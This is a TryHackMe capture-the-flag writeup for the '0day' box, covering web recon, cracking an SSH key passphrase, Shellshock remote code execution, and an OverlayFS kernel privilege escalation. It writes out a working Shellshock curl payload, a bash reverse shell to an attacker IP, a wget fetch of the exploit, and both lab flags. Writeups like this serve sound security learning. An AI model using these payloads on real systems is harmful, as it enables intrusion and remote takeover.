# TryHackMe — Shellshock / "0day" Box Writeup

## Overview
Full box compromise: web recon → directory discovery → steganography-style red herring → encrypted SSH key (dead end) → Shellshock RCE (CVE-2014-6271) → kernel privesc via OverlayFS (CVE-2015-1328) → root.

## Recon

### Directory brute-force
```
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -t 10
```

Found:
```
admin        (301)
backup       (301)
cgi-bin      (301)
secret       (301)
uploads      (301)
```

### `/secret/` — "Turtles?" red herring
```
curl -s http://<target-ip>/secret/
```
Returned an HTML page titled "Turtles?" with an embedded `turtle.png`. Checked for steganography/hidden data:
```
exiftool turtle.png
strings turtle.png | grep -iE "flag|thm"
binwalk turtle.png
```
Nothing hidden — turned out to be a non-lead / distraction.

### `/backup/` — encrypted SSH private key
Directly serves an encrypted RSA private key (`Proc-Type: 4,ENCRYPTED`, AES-128-CBC):
```
curl -s http://<target-ip>/backup/
```
Cracked the passphrase offline:
```
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
**Passphrase: `letmein`**

Tried authenticating with several guessed usernames (`admin`, `turtle`, `ubuntu`, `www-data`, `root`, `ryan`, `0day`, etc.) against SSH — **all rejected** (public key not authorized for any of them; this key turned out to be a dead end for this box).

### Homepage source — identifying details
```
curl -s http://<target-ip>/index.html
```
Revealed a personal landing page for "Ryan Montgomery" / handle **0day**, with social links. Useful for context/flavor but the username guesses derived from it (`ryan`, `0day`, `ryanmontgomery`, `ryanrohypnol`) also didn't match any valid SSH account — this entire key/identity path was a deliberate decoy.

## Foothold — Shellshock (CVE-2014-6271)

Old Apache (2.4.7 on Ubuntu 14.04) + a live `/cgi-bin/` directory is the classic Shellshock setup. Found a CGI script:
```
gobuster dir -u http://<target-ip>/cgi-bin/ -w <wordlist> -x cgi,sh,pl -t 10
```
→ `test.cgi`

Confirmed the vulnerability:
```
curl -s http://<target-ip>/cgi-bin/test.cgi -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"'
```
Returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

Got a reverse shell:
```
nc -lvnp 4444
```
```
curl -s http://<target-ip>/cgi-bin/test.cgi -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"'
```

Stabilized the shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**user.txt:** `THM{Sh3llSh0ck_r0ckz}`

## Privilege Escalation — OverlayFS (CVE-2015-1328)

Checked kernel version:
```
uname -a
```
→ `Linux ubuntu 3.13.0-32-generic` on Ubuntu 14.04.1 LTS — vulnerable to the OverlayFS local privesc.

Pulled the matching exploit on the attack box:
```
searchsploit overlayfs
searchsploit -m linux/local/37292.c
```

Served it and fetched it on target:
```
python3 -m http.server 8000      # attacker
wget http://<attacker-ip>:8000/37292.c   # target, in /tmp
```

Compilation initially failed (`gcc: error trying to exec 'cc1'`) — the compiler driver was present but its backend binary wasn't on `PATH`. Located it:
```
find / -name "cc1" 2>/dev/null
```
→ `/usr/lib/gcc/x86_64-linux-gnu/4.8/cc1`

Added it to `PATH` (exported, since the exploit itself shells out to `gcc` again mid-run to build a shared library) and compiled/ran:
```
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8
gcc 37292.c -o exploit
./exploit
```

Root shell obtained.

**root.txt:** `THM{g00d_j0b_0day_is_Pleased}`

## Key Takeaways

- Not every discovered artifact is the intended path — the `turtle.png` steganography angle and the encrypted SSH key were both red herrings; don't over-invest in one lead when it stops producing results.
- An old Apache version combined with a live `/cgi-bin/` is an immediate signal to test for Shellshock.
- `gcc` failing with a missing `cc1` error doesn't mean no compiler exists — check `find / -name cc1` before assuming you need to cross-compile.
- Kernel version (`uname -a`) should be checked early; `3.13.0-32` on Ubuntu 14.04 is a well-known indicator for both DirtyCow and OverlayFS privilege escalation.
